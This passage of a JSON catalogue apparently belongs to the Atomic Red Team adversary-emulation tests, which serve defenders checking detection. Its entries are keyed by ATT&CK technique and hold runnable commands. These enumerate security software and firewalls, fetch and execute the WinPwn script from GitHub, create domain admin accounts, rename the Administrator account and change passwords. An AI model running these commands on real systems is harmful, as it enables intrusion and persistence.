         "description": "Methods to identify Security Software on an endpoint\n\nwhen sucessfully executed, powershell is going to processes related AV products if they are running.\nNote that, depending on the privilege of current user, get-process | ?{$_.Description -like \"*\"} may not return the processes related to AV products of the check.\nFor instance, only with Administrator right, you can see the process description of McAffee processes. Hence, it is better to use get-process | ?{$_.ProcessName -like \"*\"},\nif you know the name of those processes.\n",
         "command": "get-process | ?{$_.Description -like \"*virus*\"}; get-process | ?{$_.Description -like \"*carbonblack*\"}; get-process | ?{$_.Description -like \"*defender*\"}; get-process | ?{$_.Description -like \"*cylance*\"}; get-process | ?{$_.Description -like \"*mc*\"}; get-process | ?{$_.ProcessName -like \"*mc*\"}; get-process | Where-Object { $_.ProcessName -eq \"Sysmon\" }"
      },
      {
         "technique_id": "T1518.001",
         "technique_name": "Software Discovery: Security Software Discovery",
         "tactic": "discovery",
         "description": "Discovery of installed antivirus products via a WMI query.\n\nwhen sucessfully executed, the test is going to display installed AV software.\n",
         "command": "wmic.exe /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List"
      },
      {
         "technique_id": "T1518.001",
         "technique_name": "Software Discovery: Security Software Discovery",
         "tactic": "discovery",
         "description": "Methods to identify Security Software on an endpoint\n\nwhen sucessfully executed, the test is going to display running processes, firewall configuration on network profiles\nand specific security software.\n",
         "command": "netsh.exe advfirewall  show allprofiles  && netsh.exe advfirewall firewall dump && netsh.exe advfirewall show currentprofile && netsh.exe advfirewall firewall show rule name=all && netsh.exe firewall show state && netsh.exe firewall show config && sc query windefend && powershell.exe /c \"Get-Process | Where-Object { $_.ProcessName -eq 'Sysmon' }\" && powershell.exe /c \"Get-Service | where-object {$_.DisplayName -like '*sysm*'}\" && powershell.exe /c \"Get-CimInstance Win32_Service -Filter 'Description = ''System Monitor service'''\" && tasklist.exe && tasklist.exe | findstr /i virus && tasklist.exe | findstr /i cb && tasklist.exe | findstr /i defender && tasklist.exe | findstr /i cylance && tasklist.exe | findstr /i mc && tasklist.exe | findstr /i \"virus cb defender cylance mc\""
      },
      {
         "technique_id": "T1518.001",
         "technique_name": "Software Discovery: Security Software Discovery",
         "tactic": "discovery",
         "description": "Enumerates windows firewall to retrieves firewall rules from the target computer.\n\nwhen sucessfully executed, details of windows firewall is displayed.\n",
         "command": "Get-NetFirewallProfile | Format-Table Name, Enabled; Get-NetFirewallSetting; Get-NetFirewallRule | select DisplayName, Enabled, Description"
      },
      {
         "technique_id": "T1518.001",
         "technique_name": "Software Discovery: Security Software Discovery",
         "tactic": "discovery",
         "description": "Identify AV",
         "command": "find /Applications/ -maxdepth 2 -iname *.app | grep -io \"[a-z ]*\\.app\" | grep -Ei -- \"symantec|norton|bitdefender|kapersky|eset|avast|avira|malwarebytes|sophos|(trend micro)\"\n"
      },
      {
         "technique_id": "T1518.001",
         "technique_name": "Software Discovery: Security Software Discovery",
         "tactic": "discovery",
         "description": "Identify Firewalls",
         "command": "$NameSpace = Get-WmiObject -Namespace \"root\" -Class \"__Namespace\" | Select Name | Out-String -Stream | Select-String \"SecurityCenter\";\n$SecurityCenter = $NameSpace | Select-Object -First 1;\nGet-WmiObject -Namespace \"root\\$SecurityCenter\" -Class AntiVirusProduct | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List;\n"
      },
      {
         "technique_id": "T1518.001",
         "technique_name": "Software Discovery: Security Software Discovery",
         "tactic": "discovery",
         "description": "Determine whether or not UAC is enabled",
         "command": "echo $(get-uac)\n"
      }
   ],
   "T1007": [
      {
         "technique_id": "T1007",
         "technique_name": "System Service Discovery",
         "tactic": "discovery",
         "description": "Enumerates started system services using net.exe and writes them to a file. This technique has been used by multiple threat actors.\n\nUpon successful execution, net.exe will run from cmd.exe that queries services. Expected output is to a txt file in in the temp directory called service-list.txt.\n",
         "command": "net.exe start >> %temp%\\service-list.txt"
      },
      {
         "technique_id": "T1007",
         "technique_name": "System Service Discovery",
         "tactic": "discovery",
         "description": "Identify system services.\n\nUpon successful execution, cmd.exe will execute service commands with expected result to stdout.\n",
         "command": "tasklist.exe && sc query && sc query state= all"
      },
      {
         "technique_id": "T1007",
         "technique_name": "System Service Discovery",
         "tactic": "discovery",
         "description": "Enumerates system service using systemctl\n",
         "command": "systemctl --type=service"
      },
      {
         "technique_id": "T1007",
         "technique_name": "System Service Discovery",
         "tactic": "discovery",
         "description": "Identify system services",
         "command": "Get-Service"
      }
   ],
   "T1526": [
      {
         "technique_id": "T1526",
         "technique_name": "Cloud Service Discovery",
         "tactic": "discovery",
         "description": "Upon successful execution, this test will enumerate all resources that are contained within a valid Azure subscription. \nThe resources enumerated will display on screen, as well as several csv files and folders will be output to a specified directory, listing what resources were discovered by the script. \nSee https://dev.to/cheahengsoon/enumerating-subscription-information-with-microburst-35a1\n",
         "command": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\Get-AzDomainInfo.ps1\"; $Password = ConvertTo-SecureString -String \"T1082Az\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"None\", $Password; Connect-AzAccount -Credential $Credential | out-null; Get-AzDomainInfo -folder $env:temp\\T1526Test1 -subscription \"None\" -verbose"
      }
   ],
   "T1619": [
      {
         "technique_id": "T1619",
         "technique_name": "Cloud Storage Object Discovery",
         "tactic": "discovery",
         "description": "This test will enumerate all the S3 buckets in the user account and lists all the files in each bucket. \n",
         "command": "for bucket in \"$(aws s3 ls | cut -d \" \" -f3)\"; do aws s3api list-objects-v2 --bucket $bucket --output text; done"
      }
   ],
   "T1580": [
      {
         "technique_id": "T1580",
         "technique_name": "Cloud Infrastructure Discovery",
         "tactic": "discovery",
         "description": "This atomic runs several API calls (sts:GetCallerIdentity, s3:ListBuckets, iam:GetAccountSummary, iam:ListRoles, iam:ListUsers, iam:GetAccountAuthorizationDetails, ec2:DescribeSnapshots, cloudtrail:DescribeTrails, guardduty:ListDetectors) from the context of an EC2 instance role. This simulates an attacker compromising an EC2 instance and running initial discovery commands on it. This atomic test leverages a tool called stratus-red-team built by DataDog (https://github.com/DataDog/stratus-red-team). Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.discovery.ec2-enumerate-from-instance/\n",
         "command": "if test -f \"$PathToAtomicsFolder/T1580/src/stratus\"; then : ; else if [ \"$(uname)\" = \"Darwin\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep -i Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O $PathToAtomicsFolder/T1580/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1580/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1580/src/; elif [ \"$(expr substr $(uname) 1 5)\" = \"Linux\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep -i linux_x86_64 | cut -d '\"' -f 4); wget -q -O $PathToAtomicsFolder/T1580/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1580/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1580/src/; fi; fi;  ;  export AWS_REGION=us-west-2; cd $PathToAtomicsFolder/T1580/src; echo \"Stratus: Start Warmup.\"; ./stratus warmup aws.discovery.ec2-enumerate-from-instance; echo \"Stratus: Start Detonate.\"; ./stratus detonate aws.discovery.ec2-enumerate-from-instance"
      }
   ],
   "T1120": [
      {
         "technique_id": "T1120",
         "technique_name": "Peripheral Device Discovery",
         "tactic": "discovery",
         "description": "Search for printers / potential vulns using printercheck function of WinPwn",
         "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); printercheck -noninteractive -consoleoutput"
      },
      {
         "technique_id": "T1120",
         "technique_name": "Peripheral Device Discovery",
         "tactic": "discovery",
         "description": "Perform peripheral device discovery using Get-WMIObject Win32_PnPEntity",
         "command": "Get-WMIObject Win32_PnPEntity | Format-Table Name, Description, Manufacturer > $env:TEMP\\T1120_collection.txt; $Space,$Heading,$Break,$Data = Get-Content $env:TEMP\\T1120_collection.txt; @($Heading; $Break; $Data |Sort-Object -Unique) | ? {$_.trim() -ne \"\" } |Set-Content $env:TEMP\\T1120_collection.txt"
      },
      {
         "technique_id": "T1120",
         "technique_name": "Peripheral Device Discovery",
         "tactic": "discovery",
         "description": "find attached usb devices",
         "command": "system_profiler SPUSBDataType\n"
      },
      {
         "technique_id": "T1120",
         "technique_name": "Peripheral Device Discovery",
         "tactic": "discovery",
         "description": "View details of queued documents in printer queue",
         "command": "lpq -a"
      }
   ],
   "T1010": [
      {
         "technique_id": "T1010",
         "technique_name": "Application Window Discovery",
         "tactic": "discovery",
         "description": "Compiles and executes C# code to list main window titles associated with each process.\n\nUpon successful execution, powershell will download the .cs from the Atomic Red Team repo, and cmd.exe will compile and execute T1010.exe. Upon T1010.exe execution, expected output will be via stdout.\n",
         "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -out:%TEMP%\\T1010.exe \"1b4409_T1010.cs\" && %TEMP%\\T1010.exe"
      },
      {
         "technique_id": "T1010",
         "technique_name": "Application Window Discovery",
         "tactic": "discovery",
         "description": "Extracts the names of all open non-explorer windows, and the locations of all explorer windows.",
         "command": "$x = Get-Process | Where-Object {$_.MainWindowTitle -ne \"\"} | Select-Object MainWindowTitle;\n$a = New-Object -com \"Shell.Application\"; $b = $a.windows() | select-object LocationName;\nwrite-host ($x | Format-List | Out-String) ($b | Format-List | Out-String)"
      }
   ],
   "T1136.002": [
      {
         "technique_id": "T1136.002",
         "technique_name": "Create Account: Domain Account",
         "tactic": "persistence",
         "description": "Use Admin Credentials to Create A Domain Admin Account\n",
         "command": "echo \"dn: CN=Admin User,CN=Users,DC=example,DC=test\\nchangetype: add\\nobjectClass: top\\nobjectClass: person\\nobjectClass: organizationalPerson\\nobjectClass: user\\ncn: Admin User\\nsn: User\\ngivenName: Atomic User\\nuserPrincipalName: adminuser@example.test\\nsAMAccountName: adminuser\\nuserAccountControl: 512\\nuserPassword: {CLEARTEXT}s3CureP4ssword123!\\nmemberOf: CN=Domain Admins,CN=Users,DC=example,DC=test\" > tempadmin.ldif; echo ldapadd -H ldap://example.test:389 -x -D admin@example.test -w s3CurePssw0rD! -f tempadmin.ldif; ldapadd -H ldap://example.test:389 -x -D admin@example.test -w s3CurePssw0rD! -f tempadmin.ldif"
      },
      {
         "technique_id": "T1136.002",
         "technique_name": "Create Account: Domain Account",
         "tactic": "persistence",
         "description": "Create a new account similar to ANONYMOUS LOGON in a command prompt.\n",
         "command": "net user \"ANONYMOUS  LOGON\" \"T1136_pass123!\" /add /domain"
      },
      {
         "technique_id": "T1136.002",
         "technique_name": "Create Account: Domain Account",
         "tactic": "persistence",
         "description": "Creates a new domain admin user in a command prompt.\n",
         "command": "net user \"#{username}\" \"#{password}\" /add /domain && net group \"#{group}\" \"#{username}\" /add /domain"
      },
      {
         "technique_id": "T1136.002",
         "technique_name": "Create Account: Domain Account",
         "tactic": "persistence",
         "description": "Use Admin Credentials to Create A Normal Account (as means of entry)\n",
         "command": "echo \"dn: cn=Atomic User, cn=Users,dc=example,dc=test\\nobjectClass: person\\ncn: Atomic User\\nsn: User\" > tempadmin.ldif; echo ldapadd -H ldap://example.test:389 -x -D user@example.test -w s3CurePssw0rD! -f tempadmin.ldif; ldapadd -H ldap://example.test:389 -x -D user@example.test -w s3CurePssw0rD! -f tempadmin.ldif"
      },
      {
         "technique_id": "T1136.002",
         "technique_name": "Create Account: Domain Account",
         "tactic": "persistence",
         "description": "Creates a new Domain User using the credentials of the Current User\n",
         "command": "$SamAccountName = 'T1136.002_Admin'; $AccountPassword = ConvertTo-SecureString 'T1136_pass123!' -AsPlainText -Force; Add-Type -AssemblyName System.DirectoryServices.AccountManagement; $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain); $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context); $User.SamAccountName = $SamAccountName; $TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword); $User.SetPassword($TempCred.GetNetworkCredential().Password); $User.Enabled = $True; $User.PasswordNotRequired = $False; $User.DisplayName = $SamAccountName; $User.Save(); $User"
      }
   ],
   "T1098": [
      {
         "technique_id": "T1098",
         "technique_name": "Account Manipulation",
         "tactic": "persistence",
         "description": "The adversaries want to add service principal to some Azure role, also called Azure resource role. Threat actor \nmay be interested primarily in highly privileged roles, e.g. Owner, Contributor.\nBy default, the role Reader is assigned to service principal in this test.\n\nNew-AzRoleAssignment cmdlet could be also use to assign user/service principal to resource, resource group and management group.\n\nThe account you use to run the PowerShell command must have Microsoft.Authorization/roleAssignments/write \n(e.g. such as User Access Administrator or Owner) and the Azure Active Directory Graph Directory.Read.All \nand Microsoft Graph Directory.Read.All permissions.\n\nDetection hint - check Operation Name \"Create role assignment\" in subscriptions Activity Logs.\n",
         "command": "try {if (Get-InstalledModule -Name Az.Resources -ErrorAction SilentlyContinue) { ; } else {Install-Module -Name Az.Resources -Force};  ;  Import-Module -Name Az.Resources; $PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword; Connect-AzAccount -Credential $Credential; $sp = Get-AzADServicePrincipal | where-object {$_.DisplayName -eq \"SuperSP\"}; if ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }; $subscription = Get-AzSubscription | where-object {$_.Name -eq \"Azure subscription 1\"} ; if ($subscription -eq $null) { Write-Warning \"Subscription not found\"; exit }; $role = Get-AzRoleDefinition | where-object {$_.Name -eq \"Reader\"}; if ($role -eq $null) { Write-Warning \"Role not found\"; exit }; New-AzRoleAssignment -ObjectId $sp.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription; Write-Host \"Service Principal $($sp.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)\""
      },
      {
         "technique_id": "T1098",
         "technique_name": "Account Manipulation",
         "tactic": "persistence",
         "description": "Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password.  You can then run the atomic manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was.\n",
         "command": "if (Test-Path $env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) { ; } else {New-Item -Type Directory (split-path \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\") -ErrorAction Ignore | Out-Null; $cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"; $cred.Password | ConvertFrom-SecureString | Out-File \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"};  ;  $credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"; if (Test-Path $credFile) {;     $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString);     if($cred.GetNetworkCredential().Password -eq \"Uplow-1\"){;       Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1;     };     try {;         $newPassword = ConvertTo-SecureString Uplow-1 -AsPlainText -Force;         Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword;     };     catch { ;         $_.Exception;         $errCode = $_.Exception.ErrorCode;         Write-Host \"Error code: $errCode\";         if ($errCode -eq 86) {;             Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\";             Remove-Item $credFile;         };         exit $errCode;     };     Write-Host -ForegroundColor Cyan \"Successfully changed the password to Uplow-1\";     $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"Uplow-1\" -AsPlainText -Force));     $newCred.Password | ConvertFrom-SecureString | Out-File $credFile; }; else {;     Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"; }"
      },
      {
         "technique_id": "T1098",
         "technique_name": "Account Manipulation",
         "tactic": "persistence",
         "description": "Adversaries create AWS group, add users to specific to that group to elevate their privilieges to gain more accesss\n",
         "command": "aws iam create-group --group-name; aws iam add-user-to-group --user-name"
      },
      {
         "technique_id": "T1098",
         "technique_name": "Account Manipulation",
         "tactic": "persistence",
         "description": "This Atomic will: \n  - Create a service account\n  - Create a service account key, \n  - Store the result of retrieving a single key for that service account as a variable\n  - Pass that variable for deletion\n  - Delete the service account\n\nThe idea for this Atomic came from a Rule published by the Elastic team.\n\nIdentifies the deletion of an Identity and Access Management (IAM) service account key in Google Cloud Platform (GCP).\nEach service account is associated with two sets of public/private RSA key pairs that are used to authenticate. \nIf a key is deleted, the application will no longer be able to access Google Cloud resources using that key. A security best practice is to rotate your service account keys regularly.\n\nReference: https://github.com/elastic/detection-rules/blob/main/rules/integrations/gcp/impact_gcp_storage_bucket_deleted.toml\n",
         "command": "gcloud config set project atomic-test-1; KEY=`gcloud iam service-accounts keys list --iam-account=atomic-service-account@atomic-test-1.iam.gserviceaccount.com --format=\"value(KEY_ID)\" --limit=1`; gcloud iam service-accounts keys delete $KEY --iam-account=atomic-service-account@atomic-test-1.iam.gserviceaccount.com --quiet"
      },
      {
         "technique_id": "T1098",
         "technique_name": "Account Manipulation",
         "tactic": "persistence",
         "description": "Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the atomic manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was. \n",
         "command": "if (Test-Path $env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) { ; } else {New-Item -Type Directory (split-path \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\") -ErrorAction Ignore | Out-Null; $cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"; $cred.Password | ConvertFrom-SecureString | Out-File \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"};  ;  $credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"; if (Test-Path $credFile) {;     $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString);     if($cred.GetNetworkCredential().Password -eq \"UpperLowerLong-special\"){;       Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1;     };     try {;         $newPassword = ConvertTo-SecureString UpperLowerLong-special -AsPlainText -Force;         Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword;     };     catch { ;         $_.Exception;         $errCode = $_.Exception.ErrorCode;         Write-Host \"Error code: $errCode\";         if ($errCode -eq 86) {;             Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\";             Remove-Item $credFile;         };         exit $errCode;     };     Write-Host -ForegroundColor Cyan \"Successfully changed the password to UpperLowerLong-special\";     $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"UpperLowerLong-special\" -AsPlainText -Force));     $newCred.Password | ConvertFrom-SecureString | Out-File $credFile; }; else {;     Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"; }"
      },
      {
         "technique_id": "T1098",
         "technique_name": "Account Manipulation",
         "tactic": "persistence",
         "description": "Manipulate Admin Account Name\n",
         "command": "$x = Get-Random -Minimum 2 -Maximum 9999; $y = Get-Random -Minimum 2 -Maximum 9999; $z = Get-Random -Minimum 2 -Maximum 9999; $w = Get-Random -Minimum 2 -Maximum 9999; Write-Host HaHa_$x$y$z; $fmm = Get-LocalGroupMember -Group Administrators |?{ $_.ObjectClass -match \"User\" -and $_.PrincipalSource -match \"Local\"} | Select Name; foreach($member in $fmm) {;     if($member -like \"*Administrator*\") {;         $account = $member.Name.Split(\"\\\")[-1];         $originalDescription = (Get-LocalUser -Name $account).Description;         Set-LocalUser -Name $account -Description \"atr:$account;$originalDescription\".Substring(0,48);         Rename-LocalUser -Name $account -NewName \"HaHa_$x$y$z\";         Write-Host \"Successfully Renamed $account Account on \" $Env:COMPUTERNAME;         };     }"
      },
      {
         "technique_id": "T1098",
         "technique_name": "Account Manipulation",
         "tactic": "persistence",
         "description": "Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the atomic manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was. \n",
         "command": "if (Test-Path $env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) { ; } else {New-Item -Type Directory (split-path \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\") -ErrorAction Ignore | Out-Null; $cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"; $cred.Password | ConvertFrom-SecureString | Out-File \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"};  ;  $credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"; if (Test-Path $credFile) {;     $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString);     if($cred.GetNetworkCredential().Password -eq \"onlyUPandLowChars\"){;       Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1;     };     try {;         $newPassword = ConvertTo-SecureString onlyUPandLowChars -AsPlainText -Force;         Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword;     };     catch { ;         $_.Exception;         $errCode = $_.Exception.ErrorCode;         Write-Host \"Error code: $errCode\";         if ($errCode -eq 86) {;             Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\";             Remove-Item $credFile;         };         exit $errCode;     };     Write-Host -ForegroundColor Cyan \"Successfully changed the password to onlyUPandLowChars\";     $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"onlyUPandLowChars\" -AsPlainText -Force));     $newCred.Password | ConvertFrom-SecureString | Out-File $credFile; }; else {;     Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"; }"
      },
      {
         "technique_id": "T1098",
         "technique_name": "Account Manipulation",
         "tactic": "persistence",
         "description": "The adversaries want to add service principal to some Azure AD role. Threat actor \nmay be interested primarily in highly privileged roles, e.g. Global Administrator, Application Administrator, \nPrivileged Authentication Administrator (this role can reset Global Administrator password!).\nBy default, the role Global Reader is assigned to service principal in this test.\n\nThe account you use to run the PowerShell command should have Privileged Role Administrator or Global Administrator role in your Azure AD.\n\nDetection hint - check Activity \"Add member to role\" in Azure AD Audit Logs. In targer you will also see Service Principal as a type.\n",
         "command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) { ; } else {Install-Module -Name AzureAD -Force};  ;  Import-Module -Name AzureAD; $PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword; Connect-AzureAD -Credential $Credential; $sp = Get-AzureADServicePrincipal -Filter \"DisplayName eq 'SuperSP'\"; if ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }; $role = Get-AzureADDirectoryRole -Filter \"DisplayName eq 'Global Reader'\"; if ($role -eq $null) { Write-Warning \"Role not found\"; exit }; Add-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $sp.ObjectId; Write-Host \"Service Principal $($sp.DisplayName) was added to $($role.DisplayName)\""
      },
      {
         "technique_id": "T1098",
         "technique_name": "Account Manipulation",
         "tactic": "persistence",
         "description": "Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the atomic manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was. \n",
         "command": "if (Test-Path $env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) { ; } else {New-Item -Type Directory (split-path \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\") -ErrorAction Ignore | Out-Null; $cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"; $cred.Password | ConvertFrom-SecureString | Out-File \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"};  ;  $credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"; if (Test-Path $credFile) {;     $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString);     if($cred.GetNetworkCredential().Password -eq \"Spring$((Get-Date).Year)!\"){;       Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1;     };     try {;         $newPassword = ConvertTo-SecureString Spring$((Get-Date).Year)! -AsPlainText -Force;         Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword;     };     catch { ;         $_.Exception;         $errCode = $_.Exception.ErrorCode;         Write-Host \"Error code: $errCode\";         if ($errCode -eq 86) {;             Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\";             Remove-Item $credFile;         };         exit $errCode;     };     Write-Host -ForegroundColor Cyan \"Successfully changed the password to Spring$((Get-Date).Year)!\";     $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"Spring$((Get-Date).Year)!\" -AsPlainText -Force));     $newCred.Password | ConvertFrom-SecureString | Out-File $credFile; }; else {;     Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"; }"
      },
      {
         "technique_id": "T1098",
         "technique_name": "Account Manipulation",
         "tactic": "persistence",
         "description": "Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the atomic manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was. \n",
         "command": "if (Test-Path $env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) { ; } else {New-Item -Type Directory (split-path \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\") -ErrorAction Ignore | Out-Null; $cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"; $cred.Password | ConvertFrom-SecureString | Out-File \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"};  ;  $credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"; if (Test-Path $credFile) {;     $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString);     if($cred.GetNetworkCredential().Password -eq \"lower-long-special-333\"){;       Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1;     };     try {;         $newPassword = ConvertTo-SecureString lower-long-special-333 -AsPlainText -Force;         Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword;     };     catch { ;         $_.Exception;         $errCode = $_.Exception.ErrorCode;         Write-Host \"Error code: $errCode\";         if ($errCode -eq 86) {;             Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\";             Remove-Item $credFile;         };         exit $errCode;     };     Write-Host -ForegroundColor Cyan \"Successfully changed the password to lower-long-special-333\";     $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"lower-long-special-333\" -AsPlainText -Force));     $newCred.Password | ConvertFrom-SecureString | Out-File $credFile; }; else {;     Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"; }"
      },
      {
         "technique_id": "T1098",
         "technique_name": "Account Manipulation",
         "tactic": "persistence",
         "description": "Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the atomic manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was. \n",
